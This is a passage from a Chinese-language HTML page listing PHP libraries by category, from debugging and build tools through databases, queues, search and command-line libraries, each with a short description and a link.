<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pa2ljL2l0ZXI=" title="https://github.com/nikic/iter">Iter<i class="fa fa-external-link"></i></span> - 一个使用生成器提供迭代原语的库</li>
</ul>
<h2 id="调试和性能-Debugging-and-Profiling"><a href="#调试和性能-Debugging-and-Profiling" class="headerlink" title="调试和性能( Debugging and Profiling )"></a>调试和性能( Debugging and Profiling )</h2><blockquote>
<p>调试代码的库和工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3hkZWJ1Zy94ZGVidWc=" title="https://github.com/xdebug/xdebug">xDebug<i class="fa fa-external-link"></i></span> - 一个PHP的调试和分析工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZpbHAvd2hvb3Bz" title="https://github.com/filp/whoops">whoops<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3BocGRlYnVnYmFyLmNvbS8=" title="http://phpdebugbar.com/">PHP Debug Bar<i class="fa fa-external-link"></i></span> - 一个调试工具条</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlbGRhZWsvcGhwLWNvbnNvbGU=" title="https://github.com/Seldaek/php-console">PHP Console<i class="fa fa-external-link"></i></span> - Web调试控制台</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JhcmJ1c2hpbi9waHAtY29uc29sZQ==" title="https://github.com/barbushin/php-console">Barbushin PHP Console<i class="fa fa-external-link"></i></span> -  一个使用Google Chrome的Web调试控制工具</li>
<li><span class="exturl" data-url="aHR0cDovL3BocGRiZy5jb20v" title="http://phpdbg.com/">PHPDBG<i class="fa fa-external-link"></i></span> - 一个交互性的PHP调试器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25ldHRlL3RyYWN5" title="https://github.com/nette/tracy">Tracy<i class="fa fa-external-link"></i></span> - 一个简单的错误检测、日志和时间测量库</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy56ZW5kLmNvbS9lbi9wcm9kdWN0cy9zZXJ2ZXIvei1yYXk=" title="http://www.zend.com/en/products/server/z-ray">Z-Ray<i class="fa fa-external-link"></i></span> - 一个调试和性能分析的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BoYWNpbGl0eS94aHByb2Y=" title="https://github.com/phacility/xhprof">xHprof<i class="fa fa-external-link"></i></span> - Facebook开源的PHP性能评测工具<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0V2YUVuZ2luZS94aHByb2YuaW8=" title="https://github.com/EvaEngine/xhprof.io">xhprof.io<i class="fa fa-external-link"></i></span> - 实现保存xhprof数据以及展示数据的UI</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BlcmZ0b29scy94aGd1aQ==" title="https://github.com/perftools/xhgui">xhgui<i class="fa fa-external-link"></i></span> - 另一个保存xhprof数据以及展示数据的UI</li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cDovL2JsYWNrZmlyZS5pbw==" title="http://blackfire.io">Blackfire.io<i class="fa fa-external-link"></i></span> - 一个低开销的代码探查器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVyZW4va2ludA==" title="https://github.com/raveren/kint">Kint<i class="fa fa-external-link"></i></span> - 一个调试和性能分析的工具</li>
</ul>
<h2 id="构建工具-Build-Tools"><a href="#构建工具-Build-Tools" class="headerlink" title="构建工具( Build Tools )"></a>构建工具( Build Tools )</h2><blockquote>
<p>项目构建和自动化工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hlcnJlcmEtaW8vcGhwLWdv" title="https://github.com/herrera-io/php-go">Go<i class="fa fa-external-link"></i></span> - 一个简单的PHP构建工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NISC9ib2I=" title="https://github.com/CHH/bob">Bob<i class="fa fa-external-link"></i></span> - 一个简单的项目自动化工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phejMwMy9waGFrZQ==" title="https://github.com/jaz303/phake">Phake<i class="fa fa-external-link"></i></span> -  一个PHP克隆库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2toZXJnZS9Cb3g=" title="https://github.com/kherge/Box">Box<i class="fa fa-external-link"></i></span> - 用来构建PHAR文件的工具</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5waGluZy5pbmZvLw==" title="http://www.phing.info/">Phing<i class="fa fa-external-link"></i></span> - 依据Apache Ant的PHP项目构建系统</li>
</ul>
<h2 id="任务运行器-Task-Runners"><a href="#任务运行器-Task-Runners" class="headerlink" title="任务运行器( Task Runners )"></a>任务运行器( Task Runners )</h2><blockquote>
<p>自动运行任务的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3Rhc2twaHAuZ2l0aHViLmlvLw==" title="http://taskphp.github.io/">Task<i class="fa fa-external-link"></i></span> - 依据Grunt和Gulp的纯PHP任务运行器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NvZGVneXJlL1JvYm8=" title="https://github.com/Codegyre/Robo">Robo<i class="fa fa-external-link"></i></span> - 面向对象的PHP任务运行器</li>
<li><span class="exturl" data-url="aHR0cDovL2JsZHIuaW8v" title="http://bldr.io/">Bldr<i class="fa fa-external-link"></i></span> - 构建在Symfony组件上的PHP任务运行器</li>
</ul>
<h2 id="导航-Navigation"><a href="#导航-Navigation" class="headerlink" title="导航( Navigation )"></a>导航( Navigation )</h2><blockquote>
<p>构建导航结构的工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tucExhYnMvS25wTWVudQ==" title="https://github.com/KnpLabs/KnpMenu">KnpMenu<i class="fa fa-external-link"></i></span> - 一个菜单库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RhY2trL2NhcnRvZ3JhcGhlcg==" title="https://github.com/tackk/cartographer">Cartographer<i class="fa fa-external-link"></i></span> - 一个站点地图生成库</li>
</ul>
<h2 id="资源管理-Asset-Management"><a href="#资源管理-Asset-Management" class="headerlink" title="资源管理( Asset Management )"></a>资源管理( Asset Management )</h2><blockquote>
<p>用于管理、压缩和最小化网站资源的工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tyaXN3YWxsc21pdGgvYXNzZXRpYw==" title="https://github.com/kriswallsmith/assetic">Assetic<i class="fa fa-external-link"></i></span> - 一个资源管理的管道库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NISC9waXBl" title="https://github.com/CHH/pipe">Pipe<i class="fa fa-external-link"></i></span> - 另一个资源管理的管道库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lZW5pZS9tdW5lZQ==" title="https://github.com/meenie/munee">Munee<i class="fa fa-external-link"></i></span> - 一个资源优化库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlZGl2bS9KU2hyaW5r" title="https://github.com/tedivm/JShrink">JShrink<i class="fa fa-external-link"></i></span> - 一个JavaScript的压缩库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dlYm1vemFydC9wdWxp" title="https://github.com/webmozart/puli">Puli<i class="fa fa-external-link"></i></span> - 一个检测资源绝对路径的库</li>
</ul>
<h2 id="地理定位-Geolocation"><a href="#地理定位-Geolocation" class="headerlink" title="地理定位( Geolocation )"></a>地理定位( Geolocation )</h2><blockquote>
<p>使用经纬度编码地址的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2dlb2NvZGVyLXBocC5vcmcv" title="http://geocoder-php.org/">GeoCoder<i class="fa fa-external-link"></i></span> - 一个地理编码库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocC1sb2VwL0dlb3Rvb2xz" title="https://github.com/php-loep/Geotools">GeoTools<i class="fa fa-external-link"></i></span> - 一个地理工具相关的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21qYXNjaGVuL3BocGdlbw==" title="https://github.com/mjaschen/phpgeo">PHPGeo<i class="fa fa-external-link"></i></span> - 一个简单的地理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ptaWtvbGEvZ2VvanNvbg==" title="https://github.com/jmikola/geojson">GeoJSON<i class="fa fa-external-link"></i></span> - 一个GeoJSON的实现</li>
</ul>
<h2 id="日期与时间-Date-and-Time"><a href="#日期与时间-Date-and-Time" class="headerlink" title="日期与时间( Date and Time )"></a>日期与时间( Date and Time )</h2><blockquote>
<p>处理日期和时间的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JyaWFubmVzYml0dC9DYXJib24=" title="https://github.com/briannesbitt/Carbon">Carbon<i class="fa fa-external-link"></i></span> - 一个简单的日期时间API扩展</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phc29ubGV3aXMvZXhwcmVzc2l2ZS1kYXRl" title="https://github.com/jasonlewis/expressive-date">ExpressiveDate<i class="fa fa-external-link"></i></span> - 另一个日期时间API扩展</li>
<li><span class="exturl" data-url="aHR0cDovL3lvaGFuLmdpYXJlbC5saS9DYWxlbmRS" title="http://yohan.giarel.li/CalendR">CalendR<i class="fa fa-external-link"></i></span> - 一个日历管理的库</li>
</ul>
<h2 id="事件-Event"><a href="#事件-Event" class="headerlink" title="事件( Event )"></a>事件( Event )</h2><blockquote>
<p>事件驱动或非阻塞事件循环实现的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JlYWN0cGhwL3JlYWN0" title="https://github.com/reactphp/react">React<i class="fa fa-external-link"></i></span> - 一个事件驱动的非阻塞I/O库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FzbTg5L1J4LlBIUA==" title="https://github.com/asm89/Rx.PHP">Rx.PHP<i class="fa fa-external-link"></i></span> - 一个反应扩展库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nib2Rlbi9SYXRjaGV0" title="https://github.com/cboden/Ratchet">Ratchet<i class="fa fa-external-link"></i></span> - 一个Web套接字库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hvYXByb2plY3QvV2Vic29ja2V0" title="https://github.com/hoaproject/Websocket">Hoa WebSocket<i class="fa fa-external-link"></i></span> - 另一个Web套接字库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1dpc2VtYmx5L0VsZXBoYW50Lmlv" title="https://github.com/Wisembly/Elephant.io">Elephant.io<i class="fa fa-external-link"></i></span> - 另一个Web套接字库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hvYXByb2plY3QvRXZlbnRzb3VyY2U=" title="https://github.com/hoaproject/Eventsource">Hoa EventSource<i class="fa fa-external-link"></i></span> - 一个事件源库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lnb3J3L2V2ZW5lbWVudA==" title="https://github.com/igorw/evenement">Evenement<i class="fa fa-external-link"></i></span> - 一个事件调度库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9ldmVudA==" title="https://github.com/thephpleague/event">Event<i class="fa fa-external-link"></i></span> - Event package for your app and/or domain.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nha2VwaHAvZXZlbnQ=" title="https://github.com/cakephp/event">Cake Event<i class="fa fa-external-link"></i></span> - 一个事件调度类库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FhbmRpZGF0ZS1sYWJzL2Jyb2Fkd2F5" title="https://github.com/qandidate-labs/broadway">Broadway<i class="fa fa-external-link"></i></span> - 一个事件源和CQRS库</li>
</ul>
<h2 id="日志-Logging"><a href="#日志-Logging" class="headerlink" title="日志( Logging )"></a>日志( Logging )</h2><blockquote>
<p>用于生成和处理日志文件的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlbGRhZWsvbW9ub2xvZw==" title="https://github.com/Seldaek/monolog">Monolog<i class="fa fa-external-link"></i></span> - 一个综合的日志类库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2thdHpncmF1L0tMb2dnZXI=" title="https://github.com/katzgrau/KLogger">KLogger<i class="fa fa-external-link"></i></span> - 一个易于使用的PSR-3日志类</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2picm9hZHdheS9hbmFsb2c=" title="https://github.com/jbroadway/analog">Analog<i class="fa fa-external-link"></i></span> - 一个机遇闭包的微型日志包</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25lZWtlL3NlYXNsb2c=" title="https://github.com/neeke/seaslog">SeasLog<i class="fa fa-external-link"></i></span> - 一个高效的日志扩展</li>
</ul>
<h2 id="电子商务-E-commerce"><a href="#电子商务-E-commerce" class="headerlink" title="电子商务( E-commerce )"></a>电子商务( E-commerce )</h2><blockquote>
<p>用于支付和构建在线电子商务商店的库和应用</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9vbW5pcGF5" title="https://github.com/thephpleague/omnipay">OmniPay<i class="fa fa-external-link"></i></span> - 一个多网关支付处理的框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BheXVtL3BheXVt" title="https://github.com/payum/payum">Payum<i class="fa fa-external-link"></i></span> - 一个用于支付的抽象库</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5zeWxpdXMub3JnLw==" title="http://www.sylius.org/">Sylius<i class="fa fa-external-link"></i></span> - 一个开源的电子商务解决方案</li>
<li><span class="exturl" data-url="aHR0cDovL3RoZWxpYS5uZXQvdjIv" title="http://thelia.net/v2/">Thelia<i class="fa fa-external-link"></i></span> - 另一个开源的电子商务解决方案</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hdGhpYXN2ZXJyYWVzL21vbmV5" title="https://github.com/mathiasverraes/money">Money<i class="fa fa-external-link"></i></span> -  PHP实现的Fowler金钱模式</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYmFzdGlhbmJlcmdtYW5uL21vbmV5" title="https://github.com/sebastianbergmann/money">Sebastian Money<i class="fa fa-external-link"></i></span> - 一个处理货币价值的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zsb3JpYW52L3N3YXA=" title="https://github.com/florianv/swap">Swap<i class="fa fa-external-link"></i></span> - 一个汇率库</li>
</ul>
<h2 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h2><blockquote>
<p>处理PDF文件的库和软件</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tucExhYnMvc25hcHB5" title="https://github.com/KnpLabs/snappy">Snappy<i class="fa fa-external-link"></i></span> - 一个PDF和图像的生成库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FudGlhbGl6ZS93a2h0bWx0b3BkZg==" title="https://github.com/antialize/wkhtmltopdf">WKHTMLToPDF<i class="fa fa-external-link"></i></span> - 一个将HTML转换为PDF的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BzbGl3YS9QSFBQZGY=" title="https://github.com/psliwa/PHPPdf">PHPPdf<i class="fa fa-external-link"></i></span> - 一个将XML转化为PDF和图片的库</li>
</ul>
<h2 id="Office"><a href="#Office" class="headerlink" title="Office"></a>Office</h2><blockquote>
<p>Office套装的各种文档的处理库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUE9mZmljZS9QSFBXb3Jk" title="https://github.com/PHPOffice/PHPWord">PHPWord<i class="fa fa-external-link"></i></span> - 处理Word文档的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUE9mZmljZS9QSFBFeGNlbA==" title="https://github.com/PHPOffice/PHPExcel">PHPExcel<i class="fa fa-external-link"></i></span> - 处理Excel文档的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUE9mZmljZS9QSFBQb3dlclBvaW50" title="https://github.com/PHPOffice/PHPPowerPoint">PHPPowerPoint<i class="fa fa-external-link"></i></span> - 处理PPT幻灯片的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1dpc2VtYmx5L0V4Y2VsQW50" title="https://github.com/Wisembly/ExcelAnt">ExcelAnt<i class="fa fa-external-link"></i></span> - 操作Excel文档的库</li>
</ul>
<h2 id="数据库-Database"><a href="#数据库-Database" class="headerlink" title="数据库( Database )"></a>数据库( Database )</h2><blockquote>
<p>使用对象关系映射（ORM）或数据映射技术的数据库交互库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5kb2N0cmluZS1wcm9qZWN0Lm9yZy8=" title="http://www.doctrine-project.org/">Doctrine<i class="fa fa-external-link"></i></span> - 一个完整的DBAL和ORM</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2wzcHA0cmQvRG9jdHJpbmVFeHRlbnNpb25z" title="https://github.com/l3pp4rd/DoctrineExtensions">Doctrine Extensions<i class="fa fa-external-link"></i></span> - 一个Doctrine行为的扩展集合</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5wcm9wZWxvcm0ub3JnLw==" title="http://www.propelorm.org/">Propel<i class="fa fa-external-link"></i></span> - 一个快速的ORM，迁移和查询库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lsbHVtaW5hdGUvZGF0YWJhc2U=" title="https://github.com/illuminate/database">Eloquent<i class="fa fa-external-link"></i></span> - Laravel 5 ORM(L5)</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2M5cy9MYXp5UmVjb3Jk" title="https://github.com/c9s/LazyRecord">LazyRecord<i class="fa fa-external-link"></i></span> - 一个快速的ORM</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V0cmVwYXQvYmF1bQ==" title="https://github.com/etrepat/baum">Baum<i class="fa fa-external-link"></i></span> - 一个Eloquent的嵌套集合</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZsdWNhcy9zcG90Mg==" title="https://github.com/vlucas/spot2">Spot2<i class="fa fa-external-link"></i></span> - MySQL的ORM映射器</li>
<li><span class="exturl" data-url="aHR0cDovL3JlZGJlYW5waHAuY29tLw==" title="http://redbeanphp.com/">RedBean<i class="fa fa-external-link"></i></span> - 一个轻量级、易配置的ORM</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoYW5taXg1MS9Qb21t" title="https://github.com/chanmix51/Pomm">Pomm<i class="fa fa-external-link"></i></span> - 用于PostgreSQL的一个对象模型管理器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL09jcmFtaXVzL1Byb3h5TWFuYWdlcg==" title="https://github.com/Ocramius/ProxyManager">ProxyManager<i class="fa fa-external-link"></i></span> - 用于数据映射生成代理对象的工具集合</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nha2VwaHAvb3Jt" title="https://github.com/cakephp/orm">Cake ORM<i class="fa fa-external-link"></i></span> - 对象关系映射器, 实现了使用数据映射模式(CP)</li>
<li><span class="exturl" data-url="aHR0cDovL21lZG9vLmluLw==" title="http://medoo.in/">Medoo<i class="fa fa-external-link"></i></span> - 一个轻量级的加速开发的ORM</li>
</ul>
<h2 id="迁移-Migrations"><a href="#迁移-Migrations" class="headerlink" title="迁移( Migrations )"></a>迁移( Migrations )</h2><blockquote>
<p>用于管理数据库模式和迁移的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhdmVkZXZlbG9wbWVudC9waHBtaWc=" title="https://github.com/davedevelopment/phpmig">PHPMig<i class="fa fa-external-link"></i></span> - 一个迁移管理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvYm1vcmdhbi9waGlueA==" title="https://github.com/robmorgan/phinx">Phinx<i class="fa fa-external-link"></i></span> - 一个数据库迁移管理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ljb21lZnJvbXRoZW5ldC9NaWdyYXRpb25z" title="https://github.com/icomefromthenet/Migrations">Migrations<i class="fa fa-external-link"></i></span> - 另一个迁移管理库</li>
<li><span class="exturl" data-url="aHR0cDovL2RvY3MuZG9jdHJpbmUtcHJvamVjdC5vcmcvcHJvamVjdHMvZG9jdHJpbmUtbWlncmF0aW9ucy9lbi9sYXRlc3QvdG9jLmh0bWw=" title="http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/toc.html">Doctrine Migrations<i class="fa fa-external-link"></i></span> - 用于Doctrine的迁移库</li>
</ul>
<h2 id="非关系型数据库-NoSQL"><a href="#非关系型数据库-NoSQL" class="headerlink" title="非关系型数据库( NoSQL )"></a>非关系型数据库( NoSQL )</h2><blockquote>
<p>处理NoSQL后端的库</p>
</blockquote>
<ul>
<li>MongoDB<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21vbmdvZGIvbW9uZ28tcGhwLWxpYnJhcnk=" title="https://github.com/mongodb/mongo-php-library">mongo-php-library<i class="fa fa-external-link"></i></span> - MongoDB 官方PHP库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsZXhiaWxiaWUvTW9uZ29RQg==" title="https://github.com/alexbilbie/MongoQB">MongoQB<i class="fa fa-external-link"></i></span> - 一个MongoDB的查询构建库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9tb25nYQ==" title="https://github.com/thephpleague/monga">Monga<i class="fa fa-external-link"></i></span> - 一个MongoDB的抽象库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1cmVraWQvbW9uZ29kbQ==" title="https://github.com/purekid/mongodm">mongodm<i class="fa fa-external-link"></i></span> - MongoDB ORM</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Nva2lsL3BocC1tb25nbw==" title="https://github.com/sokil/php-mongo">php-mongo<i class="fa fa-external-link"></i></span> - PHP ODM for MongoDB</li>
</ul>
</li>
<li>Redis<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25yay9wcmVkaXM=" title="https://github.com/nrk/predis">Predis<i class="fa fa-external-link"></i></span> - 一个功能完全的Redis库</li>
</ul>
</li>
</ul>
<h2 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列( Queue )"></a>队列( Queue )</h2><blockquote>
<p>处理事件和任务队列的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BkYS9waGVhbnN0YWxr" title="https://github.com/pda/pheanstalk">Pheanstalk<i class="fa fa-external-link"></i></span> - 一个Beanstalkd客户端库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZpZGVsYWx2YXJvL3BocC1hbXFwbGli" title="https://github.com/videlalvaro/php-amqplib">PHP AMQP<i class="fa fa-external-link"></i></span> - 一个纯PHP AMQP库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZpZGVsYWx2YXJvL1RodW1wZXI=" title="https://github.com/videlalvaro/Thumper">Thumper<i class="fa fa-external-link"></i></span> - 一个RabbitMQ模式库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Jlcm5hcmRwaHAvYmVybmFyZA==" title="https://github.com/bernardphp/bernard">Bernard<i class="fa fa-external-link"></i></span> - 一个多后端的抽象库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NocmlzYm91bHRvbi9waHAtcmVzcXVl" title="https://github.com/chrisboulton/php-resque">php-resque<i class="fa fa-external-link"></i></span> - 基于redis的消息队列</li>
<li><span class="exturl" data-url="aHR0cDovL2dlYXJtYW4uaW5mby8=" title="http://gearman.info/">Gearman<i class="fa fa-external-link"></i></span> - 任务分发系统</li>
</ul>
<h2 id="搜索-Search"><a href="#搜索-Search" class="headerlink" title="搜索( Search )"></a>搜索( Search )</h2><blockquote>
<p>在数据中建立索引和执行查询相关的库和软件</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VsYXN0aWNzZWFyY2gvZWxhc3RpY3NlYXJjaC1waHA=" title="https://github.com/elasticsearch/elasticsearch-php">ElasticSearch PHP<i class="fa fa-external-link"></i></span> - 用于 <span class="exturl" data-url="aHR0cDovL3d3dy5lbGFzdGljc2VhcmNoLm9yZy8=" title="http://www.elasticsearch.org/">ElasticSearch<i class="fa fa-external-link"></i></span> 的官方客户端库.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1Zmxpbi9FbGFzdGljYQ==" title="https://github.com/ruflin/Elastica">Elastica<i class="fa fa-external-link"></i></span> - 另一个ElasticSearch的客户端库</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5zb2xhcml1bS1wcm9qZWN0Lm9yZy8=" title="http://www.solarium-project.org/">Solarium<i class="fa fa-external-link"></i></span> - <span class="exturl" data-url="aHR0cDovL2x1Y2VuZS5hcGFjaGUub3JnL3NvbHIv" title="http://lucene.apache.org/solr/">Solr<i class="fa fa-external-link"></i></span> 的客户端库 .</li>
<li><span class="exturl" data-url="aHR0cDovL2Zvb2xjb2RlLmdpdGh1Yi5pby9TcGhpbnhRTC1RdWVyeS1CdWlsZGVyLw==" title="http://foolcode.github.io/SphinxQL-Query-Builder/">SphinxQL query builder<i class="fa fa-external-link"></i></span> - <span class="exturl" data-url="aHR0cDovL3NwaGlueHNlYXJjaC5jb20v" title="http://sphinxsearch.com/">Sphinx<i class="fa fa-external-link"></i></span> 搜索引擎的查询库  </li>
</ul>
<h2 id="命令行-Command-Line"><a href="#命令行-Command-Line" class="headerlink" title="命令行( Command Line )"></a>命令行( Command Line )</h2><blockquote>
<p>构建命令行工具的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5bWZvbnkvY29uc29sZQ==" title="https://github.com/symfony/console">symfony/console<i class="fa fa-external-link"></i></span> - Symfony命令行工作组件</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2QxMXd0cS9ib3Jpcw==" title="https://github.com/d11wtq/boris">Boris<i class="fa fa-external-link"></i></span> - 一个微型的PHP REPL</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JvYnRoZWNvdy9wc3lzaA==" title="https://github.com/bobthecow/psysh">PsySH<i class="fa fa-external-link"></i></span> - 另一个PHP REPL</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21jcnVtbS9wZWNhbg==" title="https://github.com/mcrumm/pecan">Pecan<i class="fa fa-external-link"></i></span> - 一个事件驱动，非阻塞的shell</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3VscmljaHNnL2dldG9wdC1waHA=" title="https://github.com/ulrichsg/getopt-php">GetOpt<i class="fa fa-external-link"></i></span> - 一个命令行选择解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NISC9vcHRwYXJzZQ==" title="https://github.com/CHH/optparse">OptParse<i class="fa fa-external-link"></i></span> - 另一个命令行选择解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25hdGVnb29kL2NvbW1hbmRv" title="https://github.com/nategood/commando">Commando<i class="fa fa-external-link"></i></span> - 一个简单的命令行选择解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2M5cy9waHAtR2V0T3B0aW9uS2l0" title="https://github.com/c9s/php-GetOptionKit">GetOptionKit<i class="fa fa-external-link"></i></span> - 同样还是一个命令行选择解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL210ZG93bGluZy9jcm9uLWV4cHJlc3Npb24=" title="https://github.com/mtdowling/cron-expression">Cron Expression<i class="fa fa-external-link"></i></span> -计算cron运行日期的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01yUmlvL3NoZWxsd3JhcA==" title="https://github.com/MrRio/shellwrap">ShellWrap<i class="fa fa-external-link"></i></span> - 一个简单的命令行包装库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hvYXByb2plY3QvQ29uc29sZQ==" title="https://github.com/hoaproject/Console">Hoa Console<i class="fa fa-external-link"></i></span> - 另一个命令行库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocC1sb2VwL3NodW50" title="https://github.com/php-loep/shunt">Shunt<i class="fa fa-external-link"></i></span> -一个在多台远程机器上并行运行的命令行库</li>
